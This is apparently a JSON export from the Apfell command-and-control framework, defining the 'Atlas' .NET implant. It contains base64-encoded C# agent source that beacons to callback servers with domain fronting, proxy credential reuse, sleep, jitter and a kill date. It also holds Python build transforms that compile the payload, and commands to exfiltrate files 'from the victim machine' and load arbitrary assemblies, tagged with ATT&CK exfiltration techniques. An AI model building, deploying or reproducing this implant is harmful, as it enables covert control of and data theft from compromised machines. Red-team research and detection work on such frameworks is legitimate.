50aWFsKENvbmZpZy5Qcm94eVVzZXIsIENvbmZpZy5Qcm94eVBhc3N3b3JkKQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgY2xpZW50LlByb3h5ID0gcHJveHk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjbGllbnQuSGVhZGVycy5BZGQoIlVzZXItQWdlbnQiLCBDb25maWcuVXNlckFnZW50KTsNCiAgICAgICAgICAgIGlmIChDb25maWcuSG9zdEhlYWRlciAhPSAiIikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBjbGllbnQuSGVhZGVycy5BZGQoIkhvc3QiLCBDb25maWcuSG9zdEhlYWRlcik7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjbGllbnQuUXVlcnlTdHJpbmcuQWRkKENvbmZpZy5QYXJhbSwgQjY0RGF0YS5SZXBsYWNlKCIrIiwgIiUyQiIpLlJlcGxhY2UoIi8iLCAiJTJGIikuUmVwbGFjZSgiPSIsICIlM0QiKS5SZXBsYWNlKCJcbiIsICIlMEEiKSk7DQogICAgICAgICAgICBDb25maWcuU2VydmVycyA9IENvbmZpZy5TZXJ2ZXJzLk9yZGVyQnkocz0+cy5jb3VudCkuVG9MaXN0KCk7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXN1bHQgPSBjbGllbnQuRG93bmxvYWRTdHJpbmcoQ29uZmlnLlNlcnZlcnNbMF0uZG9tYWluICsgQ29uZmlnLlVybCk7DQogICAgICAgICAgICAgICAgcmV0dXJuIHJlc3VsdDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgQ29uZmlnLlNlcnZlcnNbMF0uY291bnQrKzsgDQogICAgICAgICAgICAgICAgcmV0dXJuIHJlc3VsdDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFBvc3Qoc3RyaW5nIEI2NERhdGEpDQogICAgICAgIHsNCiAgICAgICAgICAgIHN0cmluZyByZXN1bHQgPSBudWxsOw0KICAgICAgICAgICAgV2ViQ2xpZW50IGNsaWVudCA9IG5ldyBTeXN0ZW0uTmV0LldlYkNsaWVudCgpOw0KICAgICAgICAgICAgaWYgKENvbmZpZy5EZWZhdWx0UHJveHkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgY2xpZW50LlByb3h5ID0gV2ViUmVxdWVzdC5EZWZhdWx0V2ViUHJveHk7DQogICAgICAgICAgICAgICAgY2xpZW50LlVzZURlZmF1bHRDcmVkZW50aWFscyA9IHRydWU7DQogICAgICAgICAgICAgICAgY2xpZW50LlByb3h5LkNyZWRlbnRpYWxzID0gQ3JlZGVudGlhbENhY2hlLkRlZmF1bHROZXR3b3JrQ3JlZGVudGlhbHM7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgV2ViUHJveHkgcHJveHkgPSBuZXcgV2ViUHJveHkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIEFkZHJlc3MgPSBuZXcgVXJpKENvbmZpZy5Qcm94eUFkZHJlc3MpLA0KICAgICAgICAgICAgICAgICAgICBVc2VEZWZhdWx0Q3JlZGVudGlhbHMgPSBmYWxzZSwNCiAgICAgICAgICAgICAgICAgICAgQ3JlZGVudGlhbHMgPSBuZXcgTmV0d29ya0NyZWRlbnRpYWwoQ29uZmlnLlByb3h5VXNlciwgQ29uZmlnLlByb3h5UGFzc3dvcmQpDQogICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICBjbGllbnQuUHJveHkgPSBwcm94eTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNsaWVudC5IZWFkZXJzLkFkZCgiVXNlci1BZ2VudCIsIENvbmZpZy5Vc2VyQWdlbnQpOw0KICAgICAgICAgICAgaWYgKENvbmZpZy5Ib3N0SGVhZGVyICE9ICIiKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGNsaWVudC5IZWFkZXJzLkFkZCgiSG9zdCIsIENvbmZpZy5Ib3N0SGVhZGVyKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIENvbmZpZy5TZXJ2ZXJzID0gQ29uZmlnLlNlcnZlcnMuT3JkZXJCeShzID0+IHMuY291bnQpLlRvTGlzdCgpOw0KICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmVzdWx0ID0gY2xpZW50LlVwbG9hZFN0cmluZyhDb25maWcuU2VydmVyc1swXS5kb21haW4gKyBDb25maWcuVXJsLCBCNjREYXRhKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gcmVzdWx0Ow0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBDb25maWcuU2VydmVyc1swXS5jb3VudCsrOw0KICAgICAgICAgICAgICAgIHJldHVybiByZXN1bHQ7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiNlbmRpZg0KICAgIH0NCn0NCg=="}],"c2_profiles":{"default":[{"Config_temp.cs":"77u\/dXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWM7DQoNCm5hbWVzcGFjZSBBdGxhcw0Kew0KICAgIHB1YmxpYyBjbGFzcyBDb25maWcNCiAgICB7DQogICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxzdHJpbmc+IENhbGxiYWNrSG9zdHMgPSBuZXcgTGlzdDxzdHJpbmc+IHsgImNhbGxiYWNrX2hvc3Q6Y2FsbGJhY2tfcG9ydCIgfTsNCiAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PFV0aWxzLlNlcnZlcj4gU2VydmVycyA9IG5ldyBMaXN0PFV0aWxzLlNlcnZlcj4geyB9Ow0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBQYXlsb2FkVVVJRCA9ICIlVVVJRCUiOw0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBVVUlEID0gIiI7DQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFVzZXJBZ2VudCA9ICJVU0VSX0FHRU5UIjsNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgSG9zdEhlYWRlciA9ICJkb21haW5fZnJvbnQiOw0KICAgICAgICBwdWJsaWMgc3RhdGljIGludCBTbGVlcCA9IGNhbGxiYWNrX2ludGVydmFsOw0KICAgICAgICBwdWJsaWMgc3RhdGljIGludCBKaXR0ZXIgPSBjYWxsYmFja19qaXR0ZXI7DQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEtpbGxEYXRlID0gImtpbGxkYXRlIjsNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgUGFyYW0gPSAiaWQiOw0KICAgICAgICBwdWJsaWMgY29uc3QgaW50IENodW5rU2l6ZSA9IDUxMjAwMDsNCiAgICAgICAgcHVibGljIHN0YXRpYyBib29sIERlZmF1bHRQcm94eSA9IHRydWU7DQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFByb3h5QWRkcmVzcyA9ICIiOw0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBQcm94eVVzZXIgPSAiIjsNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgUHJveHlQYXNzd29yZCA9ICIiOw0KI2lmIChERUZBVUxUIHx8IERFRlVMQVRfUFNLIHx8IERFRkFVTFRfRUtFKQ0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBVcmwgPSAiL2FwaS92MS40L2FnZW50X21lc3NhZ2UiOw0KI2VuZGlmDQojaWYgKERlZmF1bHRfUFNLIHx8IERFRkFVTFRfRUtFKQ0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBQc2sgPSAiQUVTUFNLIjsNCiNlbmRpZg0KI2lmIERFRkFVTFRfRUtFDQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFNlc3Npb25JZCA9ICIiOw0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyB0ZW1wVVVJRCA9ICIiOw0KICAgICAgICBwdWJsaWMgc3RhdGljIFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUlNBQ3J5cHRvU2VydmljZVByb3ZpZGVyIFJzYTsNCiNlbmRpZg0KICAgICAgICBwdWJsaWMgc3RhdGljIERpY3Rpb25hcnk8c3RyaW5nLCBzdHJpbmc+IE1vZHVsZXMgPSBuZXcgRGljdGlvbmFyeTxzdHJpbmcsIHN0cmluZz4oKTsNCiAgICB9DQp9DQo="}]},"load_transforms":[],"create_transforms":[{"parameter":"x86\nx64\nanycpu","description":"Architecture to target when compiling","transform":"save_parameter","parameter_type":"ChooseOne","order":2},{"parameter":"DEFAULT\nDEFAULT_PSK\nDEFAULT_EKE","description":"Profile\/encryption to use","transform":"save_parameter","parameter_type":"ChooseOne","order":3},{"parameter":"id","description":"Specify the query parameter to use for GET requests","transform":"save_string_parameter","parameter_type":"String","order":4},{"parameter":"512000","description":"Specify the chunking size to use for download\/upload and command output","transform":"save_string_parameter","parameter_type":"String","order":5},{"parameter":"true\nfalse","description":"True will use the system's default proxy settings, false will use proxy settings specify below","transform":"save_parameter","parameter_type":"ChooseOne","order":6},{"parameter":"3.5\n4.0","description":"","transform":"save_parameter","parameter_type":"ChooseOne","order":1},{"parameter":"","description":"(Optional) Specify the proxy address to use for web requests ","transform":"save_string_parameter","parameter_type":"String","order":7},{"parameter":"","description":"(Optional) Specify the password to use to authenticate to the proxy server","transform":"save_string_parameter","parameter_type":"String","order":8},{"parameter":"","description":"(Optional) Specify the username to use to authenticate to the proxy server","transform":"save_string_parameter","parameter_type":"String","order":9},{"parameter":"","description":"Compile Atlas payload","transform":"atlas_compile_and_return","parameter_type":"None","order":11},{"parameter":"","description":"","transform":"atlas_stamp_parameters","parameter_type":"None","order":10}],"transforms":[{"code":"YXN5bmMgZGVmIHN3YXBfc2hvcnRuYW1lcyhzZWxmLCB0YXNrX3BhcmFtczogc3RyLCBwYXJhbWV0ZXI6IE5vbmUpIC0+IHN0cjoNCiAgICAjIHNldHMgYSBmbGFnIHRvIHN3YXAgcGFyYW1ldGVycyB0aGF0IGVuZCBpbiBfaWQgd2l0aCBmaWxlbmFtZXMgaWYgdGhlIGN1cnJlbnQgdmFsdWUgZXhpc3RzIGFzIGEgZmlsZSBuYW1lDQogICAgaW1wb3J0IGpzb24NCiAgICB0cnk6DQogICAgICAgIHBhcmFtcyA9IGpzb24ubG9hZHModGFza19wYXJhbXMpDQogICAgICAgIHBhcmFtc1snc3dhcF9zaG9ydG5hbWVzJ10gPSBUcnVlDQogICAgICAgIHJldHVybiBqc29uLmR1bXBzKHBhcmFtcykNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIHByaW50KCJjYW4ndCBhZGQgc3dhcF9zaG9ydG5hbWVzIGZpZWxkIHNpbmNlIGl0J3Mgbm90IGpzb24iKQ0KICAgIHJldHVybiB0YXNrX3BhcmFtcw==","name":"swap_shortnames","parameter_type":"None","description":"Swap *_id parameter filename to corresponding file_id","is_command_code":true,"timestamp":"02\/27\/2020 22:45:51","id":13,"operator":"apfell_admin"},{"code":"YXN5bmMgZGVmIGF0bGFzX3J1bmFzc2VtYmx5X3Nob3J0aGFuZChzZWxmLCB0YXNrX3BhcmFtczpzdHIsIHBhcmFtZXRlcjogTm9uZSkgLT4gc3RyOg0KICAgIGltcG9ydCBqc29uDQogICAgaW1wb3J0IHNobGV4DQogICAgdHJ5Og0KICAgICAgICBqc29uLmxvYWRzKHRhc2tfcGFyYW1zKQ0KICAgICAgICByZXR1cm4gdGFza19wYXJhbXMgICMgaWYgaXQncyBhbHJlYWR5IEpTT04sIGxldCBpdCBiZQ0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgcGFzcw0KICAgIGZpbGVzID0gc2hsZXguc3BsaXQodGFza19wYXJhbXMpDQogICAgdGFza19kaWN0ID0geyJhc3NlbWJseV9pZCI6IGZpbGVzWzBdLCAiYXJncyI6ICcgJy5qb2luKGZpbGVzWzE6XSl9DQogICAgcmV0dXJuIGpzb24uZHVtcHModGFza19kaWN0KQ==","name":"atlas_runassembly_shorthand","parameter_type":"None","description":"Swap out filename for needed file_id","is_command_code":true,"timestamp":"02\/27\/2020 22:42:46","id":11,"operator":"apfell_admin"},{"code":"YXN5bmMgZGVmIGF0bGFzX3VwbG9hZF9zaG9ydGhhbmQoc2VsZiwgdGFza19wYXJhbXM6c3RyLCBwYXJhbWV0ZXI6IE5vbmUpIC0+IHN0cjoNCiAgICBpbXBvcnQganNvbg0KICAgIGltcG9ydCBzaGxleA0KICAgIHRyeToNCiAgICAgICAganNvbi5sb2Fkcyh0YXNrX3BhcmFtcykNCiAgICAgICAgcmV0dXJuIHRhc2tfcGFyYW1zICAjIGlmIGl0J3MgYWxyZWFkeSBKU09OLCBsZXQgaXQgYmUNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIHBhc3MNCiAgICBmaWxlcyA9IHNobGV4LnNwbGl0KHRhc2tfcGFyYW1zKQ0KICAgIHRhc2tfZGljdCA9IHsiYXNzZW1ibHlfaWQiOiBmaWxlc1swXSwgInJlbW90ZV9wYXRoIjogJyAnLmpvaW4oZmlsZXNbMTpdKX0NCiAgICByZXR1cm4ganNvbi5kdW1wcyh0YXNrX2RpY3Qp","name":"atlas_upload_shorthand","parameter_type":"None","description":"Swap out filename for needed file_id","is_command_code":true,"timestamp":"02\/27\/2020 22:43:34","id":12,"operator":"apfell_admin"},{"code":"YXN5bmMgZGVmIGF0bGFzX2xvYWRhc3NlbWJseV9zaG9ydGhhbmQoc2VsZiwgdGFza19wYXJhbXM6c3RyLCBwYXJhbWV0ZXI6IE5vbmUpIC0+IHN0cjoNCiAgICBpbXBvcnQganNvbg0KICAgIGltcG9ydCBzaGxleA0KICAgIHRyeToNCiAgICAgICAganNvbi5sb2Fkcyh0YXNrX3BhcmFtcykNCiAgICAgICAgcmV0dXJuIHRhc2tfcGFyYW1zICAjIGlmIGl0J3MgYWxyZWFkeSBKU09OLCBsZXQgaXQgYmUNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIHBhc3MNCiAgICBmaWxlcyA9IHNobGV4LnNwbGl0KHRhc2tfcGFyYW1zKQ0KICAgIHRhc2tfZGljdCA9IHsiYXNzZW1ibHlfaWQiOiBmaWxlc1swXSwgInJlbW90ZV9wYXRoIjogIiJ9DQogICAgcmV0dXJuIGpzb24uZHVtcHModGFza19kaWN0KQ==","name":"atlas_loadassembly_shorthand","parameter_type":"None","description":"Swap out filenames for needed file_id","is_command_code":true,"timestamp":"02\/27\/2020 22:41:52","id":10,"operator":"apfell_admin"},{"code":"YXN5bmMgZGVmIHNhdmVfcGFyYW1ldGVyKHNlbGYsIHByaW9yX291dHB1dDogTm9uZSwgcGFyYW1ldGVyOiBzdHIpIC0+IE5vbmU6CiAgICBzZWxmLnNhdmVkX2FycmF5LmFwcGVuZChwYXJhbWV0ZXIpCiAgICByZXR1cm4gTm9uZQ==","name":"save_parameter","parameter_type":"ChooseOne","description":"Save a value as the next element in self.saved_array","is_command_code":false,"timestamp":"02\/27\/2020 19:08:01","id":8,"operator":"apfell_admin"},{"code":"YXN5bmMgZGVmIHNhdmVfc3RyaW5nX3BhcmFtZXRlcihzZWxmLCBwcmlvcl9vdXRwdXQ6IE5vbmUsIHBhcmFtZXRlcjogc3RyKSAtPiBOb25lOgogICAgc2VsZi5zYXZlZF9hcnJheS5hcHBlbmQocGFyYW1ldGVyKQogICAgcmV0dXJuIE5vbmU=","name":"save_string_parameter","parameter_type":"String","description":"Save a string parameter to saved_array","is_command_code":false,"timestamp":"02\/29\/2020 23:11:11","id":14,"operator":"apfell_admin"},{"code":"YXN5bmMgZGVmIGF0bGFzX2NvbXBpbGVfYW5kX3JldHVybihzZWxmLCBwcmlvcl9vdXRwdXQ6IE5vbmUsIHBhcmFtZXRlcjogc3RyKSAtPiBieXRlYXJyYXk6DQogICAgdHJ5Og0KICAgICAgICBpZiBsZW4oc2VsZi5zYXZlZF9hcnJheSkgPCA2Og0KICAgICAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCJJbmNvcnJlY3QgbnVtYmVyIG9mIHNhdmVkIGFyZ3VtZW50cyIpDQogICAgICAgIGFyY2ggPSBzZWxmLnNhdmVkX2FycmF5WzFdDQogICAgICAgIHByb2ZpbGUgPSBzZWxmLnNhdmVkX2FycmF5WzJdDQogICAgICAgIGlmIHNlbGYuc2F2ZWRfYXJyYXlbMF0gPT0gIjQuMCI6DQogICAgICAgICAgICBjb21tYW5kID0gIi91c3IvYmluL21jcyAtdGFyZ2V0OndpbmV4ZSAtc2RrOjMuNSAtcGxhdGZvcm06e30gLWRlZmluZTpcIlRSQUNFLHt9XCIgLW9wdGltaXplKyAtb3V0OkF0bGFzLmV4ZSBDb25maWcuY3MgIENyeXB0by5jcyAgSHR0cF80LjAuY3MgTW9kdWxlcy5jcyAgUHJvZ3JhbS5jcyBVdGlscy5jcyIuZm9ybWF0KGFyY2gsIHByb2ZpbGUpDQogICAgICAgIGVsaWYgc2VsZi5zYXZlZF9hcnJheVswXSA9PSAiMy41IjoNCiAgICAgICAgICAgIGNvbW1hbmQgPSAiL3Vzci9iaW4vZ21jcyAvbm9jb25maWcgL2RlYnVnLSAvb3B0aW1pemUrIC9vdXQ6QXRsYXMuZXhlIENvbmZpZy5jcyBDcnlwdG8uY3MgSHR0cF8zLjUuY3MgTW9kdWxlcy5jcyBQcm9ncmFtLmNzIFV0aWxzLmNzIC90YXJnZXQ6d2luZXhlIC9kZWZpbmU6VFJBQ0Use30gL3BsYXRmb3JtOnt9IC9yZWZlcmVuY2U6L3Vzci9saWIvbW9uby8yLjAvU3lzdGVtLmRsbCAvcmVmZXJlbmNlOi91c3IvbGliL21vbm8vMi4wL1N5c3RlbS5YbWwuTGlucS5kbGwgL3JlZmVyZW5jZTovdXNyL2xpYi9tb25vLzIuMC9TeXN0ZW0uRGF0YS5EYXRhU2V0RXh0ZW5zaW9ucy5kbGwgL3JlZmVyZW5jZTovdXNyL2xpYi9tb25vL2dhYy9NaWNyb3NvZnQuQ1NoYXJwLzQuMC4wLjBfX2IwM2Y1ZjdmMTFkNTBhM2EvTWljcm9zb2Z0LkNTaGFycC5kbGwgL3JlZmVyZW5jZTovdXNyL2xpYi9tb25vLzIuMC9TeXN0ZW0uRGF0YS5kbGwgL3JlZmVyZW5jZTovdXNyL2xpYi9tb25vLzIuMC9TeXN0ZW0uWG1sLmRsbCAvcmVmZXJlbmNlOi91c3IvbGliL21vbm8vMi4wL1N5c3RlbS5Db3JlLmRsbCAvd2Fybjo0Ii5mb3JtYXQocHJvZmlsZSwgYXJjaCkNCiAgICAgICAgcHJvYyA9IGF3YWl0IGFzeW5jaW8uY3JlYXRlX3N1YnByb2Nlc3Nfc2hlbGwoY29tbWFuZCwgc3Rkb3V0PWFzeW5jaW8uc3VicHJvY2Vzcy5QSVBFLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0ZGVycj1hc3luY2lvLnN1YnByb2Nlc3MuUElQRSwgY3dkPXNlbGYud29ya2luZ19kaXIpDQogICAgICAgIHN0ZG91dCwgc3RkZXJyID0gYXdhaXQgcHJvYy5jb21tdW5pY2F0ZSgpDQogICAgICAgIGlmIHN0ZG91dDoNCiAgICAgICAgICAgIHByaW50KGYnW3N0ZG91dF1cbntzdGRvdXQuZGVjb2RlKCl9JykNCiAgICAgICAgaWYgc3RkZXJyOg0KICAgICAgICAgICAgcHJpbnQoZidbc3RkZXJyXVxue3N0ZGVyci5kZWNvZGUoKX0nKQ0KICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cygie30vQXRsYXMuZXhlIi5mb3JtYXQoc2VsZi53b3JraW5nX2RpcikpOg0KICAgICAgICAgICAgcmV0dXJuIGJ5dGVhcnJheShvcGVuKCJ7fS9BdGxhcy5leGUiLmZvcm1hdChzZWxmLndvcmtpbmdfZGlyKSwgJ3JiJykucmVhZCgpKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgIyBzb21ldGhpbmcgd2VudCB3cm9uZywgcmV0dXJuIG91ciBlcnJvcnMNCiAgICAgICAgICAgIHJhaXNlIEV4Y2VwdGlvbihzdGRlcnIuZGVjb2RlKCkpDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICByYWlzZSBFeGNlcHRpb24oc3RkZXJyLmRlY29kZSgpICsgc3Rkb3V0LmRlY29kZSgpKQ==","name":"atlas_compile_and_return","parameter_type":"None","description":"Compile atlas payload","is_command_code":false,"timestamp":"03\/01\/2020 00:00:32","id":15,"operator":"apfell_admin"},{"code":"YXN5bmMgZGVmIGF0bGFzX3N0YW1wX3BhcmFtZXRlcnMoc2VsZiwgcHJpb3Jfb3V0cHV0OiBOb25lLCBwYXJhbWV0ZXI6IHN0cikgLT4gYnl0ZWFycmF5OgogICAgaWYgbGVuKHNlbGYuc2F2ZWRfYXJyYXkpIDwgNjoKICAgICAgICByYWlzZSBFeGNlcHRpb24oIkluY29ycmVjdCBudW1iZXIgb2Ygc2F2ZWQgYXJndW1lbnRzIikKICAgIHV1aWQgPSBvcGVuKCJ7fS9VdWlkLnR4dCIuZm9ybWF0KHNlbGYud29ya2luZ19kaXIpLCAncicpLnJlYWQoKQogICAgZmlsZTEgPSBvcGVuKCJ7fS9Db25maWdfdGVtcC5jcyIuZm9ybWF0KHNlbGYud29ya2luZ19kaXIpLCAncicpLnJlYWQoKQogICAgZmlsZTIgPSBvcGVuKCJ7fS9Db25maWcuY3MiLmZvcm1hdChzZWxmLndvcmtpbmdfZGlyKSwgJ3cnKQogICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCIlVVVJRCUiLCB1dWlkLnN0cmlwKCkpCiAgICBmaWxlMS5yZXBsYWNlKCclUEFSQU0lJywgc2VsZi5zYXZlZF9hcnJheVszXSkKICAgIGZpbGUxLnJlcGxhY2UoJyVDSFVOS19TSVpFJScsIHNlbGYuc2F2ZWRfYXJyYXlbNF0pCiAgICBmaWxlMS5yZXBsYWNlKCclREVGQVVMVF9QUk9YWSUnLCBzZWxmLnNhdmVkX2FycmF5WzVdKQogICAgZmlsZTEucmVwbGFjZSgnJVBST1hZX0FERFJFU1MlJywgc2VsZi5zYXZlZF9hcnJheVs2XSkKICAgIGZpbGUxLnJlcGxhY2UoJyVQUk9YWV9VU0VSJScsIHNlbGYuc2F2ZWRfYXJyYXlbN10pCiAgICBmaWxlMS5yZXBsYWNlKCclUFJPWFlfUEFTU1dPUkQlJywgc2VsZi5zYXZlZF9hcnJheVs4XSkKICAgIGZpbGUyLndyaXRlKGZpbGUxKQogICAgZmlsZTIuY2xvc2UoKQ==","name":"atlas_stamp_parameters","parameter_type":"None","description":"Stamp in parameters for Atlas payload","is_command_code":false,"timestamp":"03\/02\/2020 04:31:13","id":16,"operator":"apfell_admin"}],"commands":[{"needs_admin":false,"help_cmd":"jobs","version":1,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","is_agent_generator":false,"author":"","deleted":false,"description":"Retrieve a list of currently running jobs","cmd":"jobs","parameters":[],"attack":[],"artifacts":[],"files":[],"transforms":[]},{"needs_admin":false,"help_cmd":"listloaded","version":1,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","is_agent_generator":false,"author":"","deleted":false,"description":"Retrieve a list of .NET assemblies loaded via the loadassembly command. ","cmd":"listloaded","parameters":[],"attack":[],"artifacts":[],"files":[],"transforms":[]},{"needs_admin":false,"help_cmd":"jobkill [job id]","version":2,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","is_agent_generator":false,"author":"","deleted":false,"description":"Kills a running job and removes it from the atlas instance's list of running jobs.","cmd":"jobkill","parameters":[{"type":"String","hint":"The Job Id for the running job to be killed","choices":"","required":true,"name":"job_id"}],"attack":[],"artifacts":[],"files":[],"transforms":[]},{"needs_admin":false,"help_cmd":"config [info | domain | sleep | jitter | host_header | user_agent | param | proxy] [add | remove | use_default | address | username | password] [options]","version":1,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","is_agent_generator":false,"author":"","deleted":false,"description":"","cmd":"config","parameters":[],"attack":[],"artifacts":[],"files":[],"transforms":[]},{"needs_admin":false,"help_cmd":"runassembly [filename] [assembly arguments]","version":2,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","is_agent_generator":false,"author":"","deleted":false,"description":"Execute the entrypoint of a assembly loaded by the loadassembly command and redirect the console output back to the Apfell server.","cmd":"runassembly","parameters":[{"type":"String","hint":"","choices":"","required":true,"name":"assembly_id"},{"type":"String","hint":"","choices":"","required":false,"name":"args"}],"attack":[],"artifacts":[],"files":[],"transforms":[{"order":2,"parameter":"","active":true,"description":"","timestamp":"03\/02\/2020 03:40:15","command":"runassembly","command_id":102,"payload_type":"atlas","transform":"swap_shortnames","parameter_type":"None"},{"order":1,"parameter":"","active":true,"description":"","timestamp":"03\/02\/2020 03:40:15","command":"runassembly","command_id":102,"payload_type":"atlas","transform":"atlas_runassembly_shorthand","parameter_type":"None"}]},{"needs_admin":false,"help_cmd":"exit","version":1,"is_exit":true,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","is_agent_generator":false,"author":"","deleted":false,"description":"This exits the current atlas instance by leveraging the Environment.Exit class method.","cmd":"exit","parameters":[],"attack":[],"artifacts":[],"files":[],"transforms":[]},{"needs_admin":false,"help_cmd":"upload {\"assembly_id\": 65, \"remote_path\": \"path to file\"}","version":2,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","is_agent_generator":false,"author":"","deleted":false,"description":"Take a file from the database and store it on disk through the callback.","cmd":"upload","parameters":[{"type":"File","hint":"","choices":"","required":true,"name":"assembly_id"},{"type":"String","hint":"Path to save the remote file too (default is current directory)","choices":"","required":true,"name":"remote_path"}],"attack":[{"t_num":"T1132","attack_name":"Data Encoding"},{"t_num":"T1030","attack_name":"Data Transfer Size Limits"},{"t_num":"T1041","attack_name":"Exfiltration Over Command and Control Channel"}],"artifacts":[],"files":[],"transforms":[{"order":2,"parameter":"","active":true,"description":"","timestamp":"03\/02\/2020 03:40:15","command":"upload","command_id":104,"payload_type":"atlas","transform":"swap_shortnames","parameter_type":"None"},{"order":1,"parameter":"","active":true,"description":"","timestamp":"03\/02\/2020 03:40:15","command":"upload","command_id":104,"payload_type":"atlas","transform":"atlas_upload_shorthand","parameter_type":"None"}]},{"needs_admin":false,"help_cmd":"loadassembly [assembly filename]","version":2,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","is_agent_generator":false,"author":"","deleted":false,"description":"Load an arbitrary .NET assembly via Assembly.Load and track the assembly FullName to call for execution with the runassembly command. If assembly is loaded through Apfell's services -> host file, then operators can simply specify the filename from the uploaded file","cmd":"loadassembly","parameters":[{"type":"File","hint":"","choices":"","required":true,"name":"assembly_id"}],"attack":[],"artifacts":[],"files":[],"transforms":[{"order":2,"parameter":"","active":true,"description":"","timestamp":"03\/02\/2020 03:40:15","command":"loadassembly","command_id":105,"payload_type":"atlas","transform":"swap_shortnames","parameter_type":"None"},{"order":1,"parameter":"","active":true,"description":"","timestamp":"03\/02\/2020 03:40:15","command":"loadassembly","command_id":105,"payload_type":"atlas","transform":"atlas_loadassembly_shorthand","parameter_type":"None"}]},{"needs_admin":false,"help_cmd":"download [path to remote file]","version":1,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":true,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","is_agent_generator":false,"author":"","deleted":false,"description":"Download a file from the victim machine to the apfell server in chunks (no need for quotes in the path). It will be saved to app\/files\/{operation name}\/downloads\/{hostname}\/{filename}","cmd":"download","parameters":[{"type":"String","hint":"Path to remote file to be downloaded","choices":"","required":true,"name":"file_path"}],"attack":[],"artifacts":[],"files":[],"transforms":[]}]}]}